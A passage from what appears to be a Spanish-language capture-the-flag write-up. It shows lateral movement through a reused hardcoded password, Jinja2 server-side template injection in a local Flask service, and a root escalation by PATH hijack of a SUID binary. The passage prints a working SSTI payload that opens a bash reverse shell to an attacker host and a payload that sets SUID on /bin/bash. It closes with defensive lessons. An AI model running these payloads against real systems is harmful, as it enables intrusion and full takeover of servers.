bash: no job control in this shell
www-data@projectmanager:/app$
```

Un upgrade estándar de TTY (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) dejó la shell utilizable.

## Movimiento Lateral — `www-data` → `andoni`

`/etc/passwd` muestra las cuentas interactivas de la máquina:

```bash
www-data@projectmanager:/app$ cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
postgres:x:101:104:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
andoni:x:1000:1001::/home/andoni:/bin/bash
ander:x:1001:1002::/home/ander:/bin/bash
```

Dos usuarios sin privilegios, `andoni` y `ander`. Buscando ficheros a los que el grupo actual pudiera llegar apareció un script fuera del ruido habitual:

```bash
www-data@projectmanager:/app$ find / -group "www-data" 2>/dev/null | grep -Ev "^/proc*|^/app|^/var"
/opt/scripts/db_report.sh
www-data@projectmanager:/app$ ls -la /opt/scripts/
-rw-r----- 1 root www-data  744 Aug 14 10:56 db_report.sh
```

El fichero es propiedad de `root` con grupo `www-data` y lectura para el grupo — así que `www-data` puede leerlo aunque no pueda escribirlo. Esa lectura es suficiente, porque el script hardcodea una credencial de servicio:

```bash
www-data@projectmanager:/app$ cat /opt/scripts/db_report.sh
#!/bin/bash
# Genera el volcado diario y lo sube al buzon del responsable de BD (andoni).
DB_NAME="projectmanager"
REPORT="/tmp/db_report_$(date +%F).csv"

# Cuenta de servicio usada para el envio automatico.
# (La misma credencial se reutiliza para el acceso SSH del responsable.)
SVC_USER="andoni"
SVC_PASS="Andoni.DBmaint_2025!"

pg_dump "$DB_NAME" > "$REPORT" 2>/dev/null

sshpass -p "$SVC_PASS" scp -o StrictHostKeyChecking=no \
    "$REPORT" "${SVC_USER}@127.0.0.1:/home/andoni/informes/"
```

El comentario lo dice en voz alta — la misma credencial se reutiliza para el login SSH de `andoni`. Reutilizándola localmente aterriza el pivote:

```bash
www-data@projectmanager:/app$ su andoni
Password:
andoni@projectmanager:/app$ cd
andoni@projectmanager:~$ cat user.txt
REDACTED
```

Este es el foothold propiamente dicho — `andoni` posee `user.txt`.

## Movimiento Lateral — `andoni` → `ander`

El home de `andoni` contenía una nota apuntando a un servicio interno:

```bash
andoni@projectmanager:~$ cat notes.txt
Recordatorio (andoni):
- El equipo de infraestructura (ander) dejo levantado un microservicio interno
  de informes que solo escucha en local (127.0.0.1). Revisar puertos abiertos:
      ss -tlnp     (o:  netstat -tlnp)
```

Los sockets en escucha confirman tres servicios solo-localhost por encima de los puertos públicos:

```bash
andoni@projectmanager:~$ netstat -ntlp
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
```

`5432` es PostgreSQL, `8000` es la app Django, y `5000` es el microservicio de informes. La lista de procesos lo atribuye a `ander`:

```bash
andoni@projectmanager:~$ ps -aux | grep meridian
ander         13  0.0  0.0  37464 31320 ?  S  10:56  0:00 /opt/venv/bin/python /opt/meridian-report/app.py
```

Como escucha en `127.0.0.1`, tuneleé el puerto 5000 hacia fuera por SSH (usando la credencial de `andoni`) para alcanzarlo desde mi navegador:

```bash
ssh -L 5000:127.0.0.1:5000 andoni@172.30.0.10 -N
```

El servicio se autodescribe en la raíz:

```json
{
  "endpoints": {
    "/health": "estado del servicio",
    "/report": "genera un informe personalizado (parametros: name, period)"
  },
  "service": "Meridian Report Service",
  "version": "1.4.2"
}
```

### SSTI en el Endpoint de Informes

`/report` renderiza un documento de estado y refleja el parámetro `name` dentro de él:

![Meridian Report Service renderizando el informe por defecto](/assets/img/Custom/ProjectManager2/cap7.png)

{% raw %}
Un servicio Flask que refleja la entrada del usuario en su salida es un candidato de primera para Server-Side Template Injection. Que refleje una expresión Jinja2 en vez de un literal es la señal — `{{7*7}}` volvió evaluado:

```text
http://127.0.0.1:5000/report?name={{7*7}}
```

![SSTI confirmada: 7 por 7 evaluado a 49](/assets/img/Custom/ProjectManager2/cap8.png)

El título del informe decía "Informe de estado — 49" — el motor de plantillas evaluó la expresión, así que esto es SSTI en Jinja2. A partir de ahí, el escape habitual hacia Python: alcanzar el `__class__` de un objeto, adentrarse en los `__globals__` de un método enlazado para conseguir `__builtins__`, y `__import__('os')` para ejecutar comandos. El objeto `config` de Flask es un gadget de partida cómodo. Envolviéndolo en un bloque `{% with %}` se mantiene el payload en un único parámetro reflejado:

```text
/report?name={% with a = config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("id").read() %}{{ a }}{% endwith %}
```

(URL-encodeado en la querystring.) El título renderizado llevaba la salida del comando:

![RCE por SSTI devolviendo el id de ander con pertenencia al grupo sysadmin](/assets/img/Custom/ProjectManager2/cap9.png)

```text
uid=1001(ander) gid=1002(ander) groups=1002(ander),1000(sysadmin)
```

El servicio corre como `ander`, que es miembro del grupo `sysadmin`. Cambiando `id` por una reverse shell se escaló la SSTI a una sesión interactiva:

```text
/report?name={% with a = config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'").read() %}{{ a }}{% endwith %}
```
{% endraw %}

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 172.30.0.10 42468
bash: cannot set terminal process group (13): Inappropriate ioctl for device
bash: no job control in this shell
ander@projectmanager:/opt/meridian-report$
```

Tras el mismo upgrade de TTY, el home de `ander` contenía el puntero hacia la escalada de privilegios:

```bash
ander@projectmanager:~$ cat notes.txt
ander (grupo sysadmin):
- Mantenimiento dejo un comprobador de servicios: /usr/local/bin/syscheck
- Es SUID root. Ojo con COMO resuelve los comandos que ejecuta internamente...
```

## Escalada de Privilegios — `ander` → `root`

La nota de `ander` nombra el vector directamente, y el barrido de SUID lo confirma — un único binario SUID-root no estándar:

```bash
ander@projectmanager:~$ find / -perm -4000 2>/dev/null
/usr/local/bin/syscheck
```

La advertencia de la nota — *ojo con CÓMO resuelve los comandos que ejecuta internamente* — es el exploit entero. Inspeccionando los strings del binario se ve qué ejecuta:

```bash
ander@projectmanager:/usr/local/bin$ strings syscheck
[...]
setgid
setuid
system
[...]
[syscheck] comprobando estado de los servicios...
systemctl is-active ssh 2>/dev/null || service ssh status 2>/dev/null
```

El binario llama a `setuid`/`setgid` (así que ejecuta el hijo con privilegios de root) y luego entrega `systemctl is-active ssh ...` a `system()`. Lo crítico: invoca `systemctl` **por nombre, no por ruta absoluta**. `system()` ejecuta su argumento a través de `/bin/sh -c`, que resuelve `systemctl` contra el `$PATH`. Como el binario SUID nunca sanea el `$PATH`, el primer `systemctl` que aparezca en el `$PATH` del llamante se ejecuta **como root** — un PATH hijack de manual.

El plan: colocar un `systemctl` malicioso en un directorio con permisos de escritura, anteponer ese directorio al `$PATH`, y ejecutar `syscheck`. El payload activa el bit SUID en `/bin/bash` para poder reentrar como root después:

```bash
ander@projectmanager:/tmp$ echo $PATH
/opt/venv/bin:/usr/bin:/bin

# systemctl malicioso, antes en el PATH que el real
ander@projectmanager:/tmp$ cat systemctl
chmod u+s /bin/bash

ander@projectmanager:/tmp$ chmod +x /tmp/systemctl
ander@projectmanager:/tmp$ export PATH=/tmp:$PATH
ander@projectmanager:/tmp$ cd /usr/local/bin/
ander@projectmanager:/usr/local/bin$ ./syscheck
ander@projectmanager:/usr/local/bin$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 May  7 20:33 /bin/bash
```

`/bin/bash` es ahora SUID root. Invocándolo con `-p` se preserva el UID efectivo en vez de descartar privilegios, dando una shell de root:

```bash
ander@projectmanager:/tmp$ /bin/bash -p
bash-5.2# whoami
root
bash-5.2# cat /root/root.txt
REDACTED
```

Root.

## Flags

| Flag     | Valor      |
|----------|------------|
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

## Puntos Clave

- **El FTP anónimo es un sink de fuga de información, no solo un recurso de ficheros.** La nota `InformaticsTasks.txt` pre-reveló la versión del framework, la existencia de un panel de administración suavemente oculto, y endpoints de API "ocultos". La sola fuga de versión (`Django 4.2`) bastó para seleccionar CVE-2025-64459 antes de tocar la aplicación.

- **`_connector` en el ORM de Django es SQL en crudo en cuanto alcanza entrada del usuario.** CVE-2025-64459 convierte cualquier endpoint que expanda un diccionario controlado por el atacante en `filter()`/`exclude()`/`get()` en un punto de inyección SQL. Un diferencial de estado 200/401 en el endpoint de login fue todo lo necesario para construir un oráculo booleano completo y volcar el esquema sin ver jamás un mensaje de error.

- **El almacenamiento de contraseñas en SHA1 sin sal se desmorona en cuanto la tabla se filtra.** Una vez volcada la tabla `users`, los hashes SHA1 planos cayeron ante rockyou al instante — una única cuenta staff (`elisabeth`) fue el pivote de la SQLi no autenticada a una sesión de superusuario.

- **El "ocultar" en cliente no es autorización.** El panel de administración se renderizaba para todo el mundo y solo condicionaba sus acciones a una comprobación en cliente; el control real eran los claims `staff`/`superuser` del JWT, que vinieron gratis en cuanto se crackeó la contraseña de una cuenta staff.

- **La reutilización de credenciales entre scripts de servicio y cuentas del SO es la primitiva de movimiento lateral más habitual en Linux.** Un script de mantenimiento legible por `www-data` hardcodeaba la contraseña de `andoni` e incluso documentaba que hacía las veces de credencial SSH — leer un fichero fue el pivote entero.

- **Los servicios solo-localhost amplían la superficie de ataque después de un foothold, no antes.** El servicio de informes en Jinja2 era invisible desde la red; solo tras aterrizar en la máquina y reenviar el puerto 5000 se volvieron alcanzables la SSTI (y el salto a un segundo usuario).

- **Un binario SUID que llama a `system()` con un nombre de comando pelado es un PATH hijack esperando a ocurrir.** `syscheck` nunca saneaba el `$PATH` antes de invocar `systemctl`, así que un `systemctl` de una línea controlado por el atacante y antes en el `$PATH` se ejecutó como root. Al auditar binarios SUID, `strings` más una comprobación de rutas absolutas en los comandos ejecutados es la forma más rápida de detectar esta clase de bug.
